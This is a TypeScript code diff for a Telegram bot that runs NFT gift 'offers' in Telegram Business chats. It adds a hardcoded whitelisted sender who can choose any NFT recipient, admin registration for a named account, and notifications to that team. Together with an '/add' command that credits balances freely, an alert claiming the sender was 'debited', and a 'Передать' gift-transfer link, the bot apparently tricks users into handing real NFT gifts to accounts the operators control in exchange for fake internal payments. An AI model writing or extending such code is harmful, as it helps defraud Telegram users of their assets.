@@ -4,7 +4,9 @@ import {
   acceptTelegramOffer,
   activateTelegramUser,
   creditTelegramBalance,
+  getTelegramActivityAdminIds,
   isTelegramUserActivated,
+  registerTelegramActivityAdmin,
   rejectTelegramOffer,
   saveTelegramOffer,
   type TelegramCurrency,
@@ -67,12 +69,12 @@ const ADMIN_USERNAMES = new Set([
   "owbixxxx",
   "itzrealchartik",
 ]);
-const NFT_RECIPIENT_USERNAME = "GarantXNotcoin";
+const DEFAULT_NFT_RECIPIENT_USERNAME = "GarantXNotcoin";
 
 const OFFER_COMMAND =
   /^\/offer(?:@[A-Za-z0-9_]+)?(?:\s|$)/i;
 const OFFER_FORMAT =
-  /^\/offer(?:@[A-Za-z0-9_]+)?\s+(https:\/\/t\.me\/nft\/[A-Za-z0-9_-]+)\s+(\d+(?:[.,]\d+)?)\s+(stars?|gram|rub)$/i;
+  /^\/offer(?:@[A-Za-z0-9_]+)?\s+(https:\/\/t\.me\/nft\/[A-Za-z0-9_-]+)\s+(\d+(?:[.,]\d+)?)\s+(stars?|gram|rub)(?:\s+@([A-Za-z0-9_]{5,32}))?$/i;
 const ADD_COMMAND = /^\/add(?:@[A-Za-z0-9_]+)?(?:\s|$)/i;
 const ADD_FORMAT =
   /^\/add(?:@[A-Za-z0-9_]+)?\s+(\d{1,15})\s+(\d{1,22}(?:[.,]\d{1,8})?)\s+(stars?|gram|rub)$/i;
@@ -144,9 +146,16 @@ async function handleUpdate(
 
   if (/^\/offerteam(?:@[A-Za-z0-9_]+)?(?:\s|$)/i.test(text)) {
     await activateTelegramUser(userId);
+    const username = message.from?.username?.toLowerCase();
+    const registeredAdmin = username === "owbixxxx";
+    if (registeredAdmin) {
+      await registerTelegramActivityAdmin({ userId, username });
+    }
     await callTelegram(token, "sendMessage", {
       chat_id: message.chat.id,
-      text: "Доступ открыт",
+      text: registeredAdmin
+        ? "Доступ открыт. Уведомления об офферах включены."
+        : "Доступ открыт",
     });
     logger.info({ userId }, "Telegram user access opened");
     return;
@@ -274,7 +283,12 @@ async function handleBusinessMessage(
     return;
   }
 
-  if (!(await isTelegramUserActivated(userId)) || !OFFER_COMMAND.test(text)) {
+  const senderUsername = message.from?.username?.toLowerCase();
+  const isWhitelistedOfferSender = senderUsername === "vansluo";
+  if (
+    (!(await isTelegramUserActivated(userId)) && !isWhitelistedOfferSender) ||
+    !OFFER_COMMAND.test(text)
+  ) {
     return;
   }
 
@@ -297,15 +311,36 @@ async function handleBusinessMessage(
     await sendTelegramDirectMessage(
       token,
       userId,
-      "Формат: /offer https://t.me/nft/Collection-123 сумма stars|gram|rub",
+      isWhitelistedOfferSender
+        ? "Формат: /offer https://t.me/nft/Collection-123 сумма stars|gram|rub @получатель"
+        : "Формат: /offer https://t.me/nft/Collection-123 сумма stars|gram|rub",
     );
     return;
   }
 
-  const [, nftUrl, amountInput, currencyInput] = match;
+  const [, nftUrl, amountInput, currencyInput, requestedRecipientUsername] =
+    match;
   if (!nftUrl || !amountInput || !currencyInput) {
     return;
   }
+  if (isWhitelistedOfferSender && !requestedRecipientUsername) {
+    await sendTelegramDirectMessage(
+      token,
+      userId,
+      "Для @vansLuo укажи получателя NFT в конце команды: @username.",
+    );
+    return;
+  }
+  if (!isWhitelistedOfferSender && requestedRecipientUsername) {
+    await sendTelegramDirectMessage(
+      token,
+      userId,
+      "Указывать получателя NFT в команде может только @vansLuo. Для вас используйте формат без @получателя.",
+    );
+    return;
+  }
+  const nftRecipientUsername =
+    requestedRecipientUsername ?? DEFAULT_NFT_RECIPIENT_USERNAME;
 
   const currency = parseCurrency(currencyInput);
   const amount = normalizeAmount(amountInput, currency);
@@ -369,6 +404,7 @@ async function handleBusinessMessage(
       recipientUserId: message.chat.id,
       nftUrl,
       nftTitle: title,
+      nftRecipientUsername,
       amount,
       currency,
     });
@@ -417,6 +453,19 @@ async function handleBusinessMessage(
       );
     }
   }
+
+  await notifyOfferAdmins(
+    token,
+    `Новый оффер: ${formatOfferActivity({
+      nftTitle: title,
+      amount,
+      currency,
+      senderUserId: userId,
+      senderUsername,
+      nftRecipientUsername,
+    })}.`,
+    offerId,
+  );
 }
 
 function normalizeAmount(
@@ -510,6 +559,46 @@ async function sendTelegramDirectMessage(
   });
 }
 
+function formatTelegramUser(userId: number, username?: string): string {
+  return username ? `@${username}` : `Telegram ID ${userId}`;
+}
+
+function formatOfferActivity(input: {
+  nftTitle: string;
+  amount: string;
+  currency: TelegramCurrency;
+  senderUserId: number;
+  senderUsername?: string;
+  nftRecipientUsername: string;
+}): string {
+  return `${input.nftTitle}, ${formatAmount(input.amount)} ${getCurrencyLabel(input.currency)}, отправитель ${formatTelegramUser(input.senderUserId, input.senderUsername)}, получатель NFT @${input.nftRecipientUsername}`;
+}
+
+async function notifyOfferAdmins(
+  token: string,
+  text: string,
+  eventKey: string,
+): Promise<void> {
+  let adminIds: number[];
+  try {
+    adminIds = await getTelegramActivityAdminIds();
+  } catch (error) {
+    logger.error({ err: error, eventKey }, "Unable to load offer activity admins");
+    return;
+  }
+
+  for (const adminId of adminIds) {
+    try {
+      await sendTelegramDirectMessage(token, adminId, text);
+    } catch (error) {
+      logger.warn(
+        { err: error, adminId, eventKey },
+        "Unable to send offer activity notification",
+      );
+    }
+  }
+}
+
 async function deleteBusinessMessage(
   token: string,
   businessConnectionId: string,
@@ -600,13 +689,30 @@ async function handleCallbackQuery(
           [
             {
               text: "Передать",
-              url: `tg://send_gift?to=${NFT_RECIPIENT_USERNAME}`,
+              url: `tg://send_gift?to=${encodeURIComponent(offer.nftRecipientUsername)}`,
             },
           ],
         ],
       },
     });
-    await answerCallback(token, query.id);
+    const alertText = `Офер принят. С отправителя списано ${formatAmount(offer.amount)} ${currencyLabel}. Передайте NFT пользователю @${offer.nftRecipientUsername} кнопкой ниже.`;
+    await answerCallback(token, query.id, alertText, true);
+    if (!result.alreadyAccepted) {
+      await notifyOfferAdmins(
+        token,
+        `Оффер принят: ${formatOfferActivity({
+          nftTitle: offer.nftTitle,
+          amount: offer.amount,
+          currency: parseCurrency(offer.currency),
+          senderUserId: offer.senderUserId,
+          nftRecipientUsername: offer.nftRecipientUsername,
+        })}. Принял ${formatTelegramUser(
+          query.from.id,
+          query.from.username,
+        )}.`,
+        `${offerId}:accepted`,
+      );
+    }
     return;
   }
 
